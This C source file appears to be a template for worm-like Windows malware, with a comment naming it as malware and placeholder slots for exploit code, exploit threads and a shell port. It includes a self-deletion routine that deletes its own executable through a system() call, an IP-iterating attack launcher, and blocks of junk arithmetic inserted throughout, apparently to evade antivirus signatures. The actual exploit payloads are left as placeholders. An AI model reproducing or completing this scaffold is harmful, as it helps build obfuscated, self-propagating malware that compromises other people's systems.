#include "test1.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";

int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);

	//[ninjaModule]
	if(argc==0){/*normal process*/
	//[moduleThreads]
	
	//[mainExploit]	

	}
	//[optionElseIf]
	else{
		SelfDelete();
		return 0;
int iayY6Z6M3gm;
int ig6smdh1G2d = 0x01b027f;
int iWDmUOXU44O = 0x6da632c;
int ihBLBVapyKj = 0x8a82e21;
for(iayY6Z6M3gm = 0; iayY6Z6M3gm < 3; iayY6Z6M3gm++)
{
    ig6smdh1G2d = iayY6Z6M3gm * 99 - 1000 * iWDmUOXU44O + 0x456 ^ 0xeb27286 % 5 - 0x227814e;
    iWDmUOXU44O = iayY6Z6M3gm * 3 + ihBLBVapyKj + 0x30 + 0x8a82e21 % 123 - iWDmUOXU44O;
    ihBLBVapyKj = iayY6Z6M3gm * 4 - 0x6da632c + 0xff / 0x123 - 0x8a82e21 % 234 - 0x227814e;
}
int i8BfTAVy0BB = ihBLBVapyKj - ig6smdh1G2d * iWDmUOXU44O + 0x8a82e21;
i8BfTAVy0BB = iayY6Z6M3gm - 50 + 100 - 0x6da632c ^ 99 * 0x0f - 0x8a82e21 % 2 - 3575 + 0x227814e;

	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);
int iF8OlGI7qCN = 0xc8fda5a;
int iNflHj7J60R = 0x3e9eb26;
int ipky3tzdHYF = 0x5ea8a8e;
int iCUEtmTzR6w = ipky3tzdHYF * iNflHj7J60R + iF8OlGI7qCN;
iNflHj7J60R = 0x188d60a - iCUEtmTzR6w + 5 + 0x2f2ef82 + 69 - iF8OlGI7qCN;
iF8OlGI7qCN = 0xc8fda5a + 10 - iNflHj7J60R % 10 + 0x5ea8a8e + 999 - iCUEtmTzR6w;
iCUEtmTzR6w = iF8OlGI7qCN % 5 + ipky3tzdHYF % 0x3e9eb26 + 0xcafebabe + iF8OlGI7qCN;
ipky3tzdHYF = 0xc8fda5a * 0x100 - iF8OlGI7qCN + 56 ^ 0x3e9eb26 + 1996 - ipky3tzdHYF;
int iVySUFyRa45 = ipky3tzdHYF / 77 + 0x5ea8a8e - 76 / ipky3tzdHYF ^ 0x33 % ipky3tzdHYF % 0x5ea8a8e;
iVySUFyRa45 = 0x2f2ef82 * 0x10 - 22 + iVySUFyRa45 + 56 ^ 0xff + iNflHj7J60R + 1996 - 2111 + ipky3tzdHYF;


	return main(argc, argv);
int ia1fQI29E50 = 0x8cf1cf7;
int iSey5iDNcUt = 0xe47e9d8;
int iZ6YHJeZqHg = ia1fQI29E50 + iSey5iDNcUt;

}

void SelfDelete(){
	char out[MAX_PATH];
	GetModuleFileNameA(NULL,(LPSTR)out,100);
	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);
int i4rspr36hhJ = 0x3374111;
int iZ93wLPS3Yk = 0x10b41e9;
int idDKKC4tkbl = 0x0f9f42c;
int iq9VafmPq5n = i4rspr36hhJ + iZ93wLPS3Yk - idDKKC4tkbl;
iq9VafmPq5n = 0xc341035 * iq9VafmPq5n + 0x8819192 - iZ93wLPS3Yk;
int iLkBfDaq7rq = iq9VafmPq5n / 0x8819192 + i4rspr36hhJ ^ idDKKC4tkbl - 0x0f9f42c;


	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);
int iXoFrCIdyeG = 0x0a72246;
int iCnvNqJqkFT = 0xcfb8104;
int i8Kz2aBjYdU = 0x1e29396;
int if0eqFmcSj0 = i8Kz2aBjYdU * iCnvNqJqkFT + iXoFrCIdyeG;
iCnvNqJqkFT = 0x6860389 - if0eqFmcSj0 + 5 + 0x08a4b3d + 69 - iXoFrCIdyeG;
iXoFrCIdyeG = 0x0a72246 + 10 - iCnvNqJqkFT % 10 + 0x1e29396 + 999 - if0eqFmcSj0;
if0eqFmcSj0 = iXoFrCIdyeG % 5 + i8Kz2aBjYdU % 0xcfb8104 + 0xcafebabe + iXoFrCIdyeG;
i8Kz2aBjYdU = 0x0a72246 * 0x100 - iXoFrCIdyeG + 56 ^ 0xcfb8104 + 1996 - i8Kz2aBjYdU;
int iRkX5ld0AFt = i8Kz2aBjYdU / 77 + 0x1e29396 - 76 / i8Kz2aBjYdU ^ 0x33 % i8Kz2aBjYdU % 0x1e29396;
iRkX5ld0AFt = 0x08a4b3d * 0x10 - 22 + iRkX5ld0AFt + 56 ^ 0xff + iCnvNqJqkFT + 1996 - 2111 + i8Kz2aBjYdU;


	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
int iCiRLPNVZUv = 0xdea2bfc;
int i2ACpzSima5 = 0x3dcbcb4;
int i7T09wk343P = 0x0ada068;
int iYQRbVc71Ii = i7T09wk343P * i2ACpzSima5 + iCiRLPNVZUv;
i2ACpzSima5 = 0x4e8576d - iYQRbVc71Ii + 5 + 0xe9c3e6e + 69 - iCiRLPNVZUv;
iCiRLPNVZUv = 0xdea2bfc + 10 - i2ACpzSima5 % 10 + 0x0ada068 + 999 - iYQRbVc71Ii;
iYQRbVc71Ii = iCiRLPNVZUv % 5 + i7T09wk343P % 0x3dcbcb4 + 0xcafebabe + iCiRLPNVZUv;
i7T09wk343P = 0xdea2bfc * 0x100 - iCiRLPNVZUv + 56 ^ 0x3dcbcb4 + 1996 - i7T09wk343P;
int ii1mZrSsk0A = i7T09wk343P / 77 + 0x0ada068 - 76 / i7T09wk343P ^ 0x33 % i7T09wk343P % 0x0ada068;
ii1mZrSsk0A = 0xe9c3e6e * 0x10 - 22 + ii1mZrSsk0A + 56 ^ 0xff + i2ACpzSima5 + 1996 - 2111 + i7T09wk343P;

	j = 0;
int iskUWUrd1XG = 0x07e55e0;
int iqaSd1SD34T = 0x4f02bf3;
int izaKmuqbdOH = iskUWUrd1XG * iqaSd1SD34T;


	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
int iRqj1CXk5Nb = 0x6e0544e;
int i23vCDAyY5U = 0xa4e5c0d;
int ihUcHK7uVbg = 0x85a3de5;
int i9zY6mDcsL3 = iRqj1CXk5Nb + i23vCDAyY5U - ihUcHK7uVbg;
i9zY6mDcsL3 = 0xe993142 * i9zY6mDcsL3 + 0x4d55f9e - i23vCDAyY5U;
int iIUthri4clL = i9zY6mDcsL3 / 0x4d55f9e + iRqj1CXk5Nb ^ ihUcHK7uVbg - 0x85a3de5;

	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
void initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
int izCFoDEDloz;
int iIXchVTBEBU = 0x0a2bdad;
int ifPGxnvntLg = 0xd3803ae;
int iEGvSWjyvj8 = 0x5d3405d;
for(izCFoDEDloz = 0; izCFoDEDloz < 3; izCFoDEDloz++)
{
    iIXchVTBEBU = izCFoDEDloz * 99 - 1000 * ifPGxnvntLg + 0x456 ^ 0xd151a27 % 5 - 0x47aabe8;
    ifPGxnvntLg = izCFoDEDloz * 3 + iEGvSWjyvj8 + 0x30 + 0x5d3405d % 123 - ifPGxnvntLg;
    iEGvSWjyvj8 = izCFoDEDloz * 4 - 0xd3803ae + 0xff / 0x123 - 0x5d3405d % 234 - 0x47aabe8;
}
int iOHlvgBRoVe = iEGvSWjyvj8 - iIXchVTBEBU * ifPGxnvntLg + 0x5d3405d;
iOHlvgBRoVe = izCFoDEDloz - 50 + 100 - 0xd3803ae ^ 99 * 0x0f - 0x5d3405d % 2 - 3575 + 0x47aabe8;

	
	//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
int i4reBeZGdj9 = 0x0f0b6a3;
int itcC0A6kBZx = 0xcc62e1a;
int ib5tjnAxQYH = 0xb04fe31;
int i8fNfLqJTwM = i4reBeZGdj9 + itcC0A6kBZx - ib5tjnAxQYH;
i8fNfLqJTwM = 0x9052ba7 * i8fNfLqJTwM + 0x86426e2 - itcC0A6kBZx;
int iXgyryo883z = i8fNfLqJTwM / 0x86426e2 + i4reBeZGdj9 ^ ib5tjnAxQYH - 0xb04fe31;

	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
